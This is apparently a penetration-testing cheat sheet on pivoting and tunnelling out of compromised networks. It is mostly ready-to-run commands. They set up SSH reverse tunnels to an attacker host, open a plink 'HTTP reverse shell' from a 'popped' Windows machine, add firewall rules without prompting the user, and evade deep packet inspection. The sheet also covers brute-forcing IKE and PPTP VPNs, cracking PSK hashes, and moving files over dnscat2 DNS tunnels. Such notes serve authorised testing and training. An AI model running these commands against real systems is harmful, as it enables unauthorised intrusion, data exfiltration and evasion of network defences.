- **Port Forwarding** - accept traffic on a given IP address and port and redirect it to a different IP address and port

apt-get install rinetd

cat /etc/rinetd.conf

\# bindadress bindport connectaddress connectport

w.x.y.z 53 a.b.c.d 80

- **SSH Local Port Forwarding**: supports bi-directional communication channels

ssh &lt;gateway&gt; -L &lt;local port to listen&gt;:&lt;remote host&gt;:&lt;remote port&gt;

- **SSH Remote Port Forwarding:** Suitable for popping a remote shell on an internal non routable network

ssh &lt;gateway&gt; -R &lt;remote port to bind&gt;:&lt;local host&gt;:&lt;local port&gt;

- **SSH Dynamic Port Forwarding**: create a SOCKS4 proxy on our local attacking box to tunnel ALL incoming traffic to ANY host in the DMZ network on ANY PORT

ssh -D &lt;local proxy port&gt; -p &lt;remote port&gt; &lt;target&gt;

- **Proxychains** - Perform nmap scan within a DMZ from an external computer

- Create reverse SSH tunnel from Popped machine on :2222

ssh -f -N -T -R22222:localhost:22 [yourpublichost.example.com](http://yourpublichost.example.com/)

ssh -f -N -R 2222:&lt;local host&gt;:22 root@&lt;remote host&gt;

- Create a Dynamic application-level port forward on 8080 thru 2222

ssh -f -N -D &lt;local host&gt;:8080 -p 2222 hax0r@&lt;remote host&gt;

  

- Leverage the SSH SOCKS server to perform Nmap scan on network using proxy chains

proxychains nmap --top-ports=20 -sT -Pn $ip/24

- **HTTP Tunneling**

        nc -vvn $ip 8888

------------------------------------------------------------------------

**Traffic Encapsulation** - Bypassing deep packet inspection

**http tunnel**
- On server side:

sudo hts -F &lt;server ip addr&gt;:&lt;port of your app&gt; 80

- On client side:

sudo htc -P &lt;my [proxy.com:proxy](http://proxy.com:proxy/) port&gt; -F &lt;port of your app&gt; &lt;server ip addr&gt;:80 stunnel

- **Tunnel Remote Desktop (RDP) from a Popped Windows machine to your network**

- Tunnel on port 22

plink -l root -pw pass -R 3389:&lt;localhost&gt;:3389 &lt;remote host&gt;

- Port 22 blocked? Try port 80? or 443?

plink -l root -pw 23847sd98sdf987sf98732 -R 3389:&lt;local host&gt;:3389 &lt;remote host&gt; -P80

- **Tunnel Remote Desktop (RDP) from a Popped Windows using HTTP Tunnel (bypass deep packet inspection)**

- Windows machine add required firewall rules without prompting the user

netsh advfirewall firewall add rule name="httptunnel\_client" dir=in action=allow program="httptunnel\_client.exe" enable=yes

netsh advfirewall firewall add rule name="3000" dir=in action=allow protocol=TCP localport=3000

netsh advfirewall firewall add rule name="1080" dir=in action=allow protocol=TCP localport=1080

netsh advfirewall firewall add rule name="1079" dir=in action=allow protocol=TCP localport=1079

- Start the http tunnel client

httptunnel\_client.exe

- Create HTTP reverse shell by connecting to localhost port 3000

plink -l root -pw 23847sd98sdf987sf98732 -R 3389:&lt;local host&gt;:3389 &lt;remote host&gt; -P 3000

- **VLAN Hopping**

git clone <https://github.com/nccgroup/vlan-hopping.git>

chmod 700 frogger.sh

./frogger.sh

- **VPN Hacking**

- Identify VPN servers:

./udp-protocol-scanner.pl -p ike $ip

- Scan a range for VPN servers:

./udp-protocol-scanner.pl -p ike -f ip.txt

- Use IKEForce to enumerate or dictionary attack VPN servers:

pip install pyip

git clone <https://github.com/SpiderLabs/ikeforce.git>

- Perform IKE VPN enumeration with IKEForce:

./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic

- Bruteforce IKE VPN using IKEForce:

./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1

- Use ike-scan to capture the PSK hash:

ike-scan

ike-scan TARGET-IP

ike-scan -A TARGET-IP

ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key

ike-scan –M –A –n example\\\_group -P hash-file.txt TARGET-I

- Use psk-crack to crack the PSK hash

psk-crack hash-file.txt

pskcrack

psk-crack -b 5 TARGET-IPkey

psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key

psk-crack -d /path/to/dictionary-file TARGET-IP-key

- **PPTP Hacking**

- Identifying PPTP, it listens on TCP: 1723 NMAP PPTP Fingerprint:

nmap –Pn -sV -p 1723 TARGET(S)

- PPTP Dictionary Attack

thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst

- **Port Forwarding/Redirection**

- PuTTY Link tunnel - SSH Tunneling

- Forward remote port to local address:

plink.exe -P 22 -l root -pw "1337" -R 445:&lt;local host&gt;:445 &lt;remote host&gt;

- **SSH Pivoting**

- SSH pivoting from one network to another:

ssh -D &lt;local host&gt;:1010 -p 22 user@&lt;remote host&gt;

- **DNS Tunneling**

- **dnscat2** supports “download” and “upload” commands for getting files (data and programs) to and from the target machine.

- Attacking Machine Installation:

apt-get update

apt-get -y install ruby-dev git make g++

gem install bundler

git clone <https://github.com/iagox86/dnscat2.git>

cd dnscat2/server

bundle instal

- Run dnscat2:

ruby ./dnscat2.rb

dnscat2&gt; New session established: 1422

dnscat2&gt; session -i 1422

- Target Machine:

  (<https://downloads.skullsecurity.org/dnscat2/>)

(<https://github.com/lukebaggett/dnscat2-powershell/>)

dnscat --host &lt;dnscat server ip&gt;


